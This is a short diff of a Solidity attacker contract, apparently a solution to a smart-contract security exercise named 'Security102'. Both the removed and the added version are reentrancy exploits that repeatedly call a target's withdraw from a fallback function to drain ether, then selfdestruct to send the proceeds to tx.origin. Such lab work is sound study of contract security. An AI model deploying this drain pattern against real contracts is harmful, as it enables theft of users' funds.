@@ -35,18 +35,15 @@ contract OptimizedAttackerSecurity102 {
     function attack(Target target) external payable {
         target.deposit{ value: msg.value }();
         target.withdraw(msg.value);
+        target.withdraw(9999 ether);
+        selfdestruct(payable(tx.origin));
     }
 
     fallback() external payable {
-        unchecked {
-            if (address(this).balance >= 10001 ether) {
-                selfdestruct(payable(tx.origin));
-            } else {
-                Target target = Target(msg.sender);
-                target.deposit{ value: msg.value }();
-                if ((msg.value << 1) > 8192 ether) target.withdraw(10001 ether);
-                else target.withdraw(msg.value << 1);
-            }
+        Target target = Target(msg.sender);
+        if (address(this).balance == 1 ether) {
+            target.withdraw(1 ether);
         }
     }
 }
+
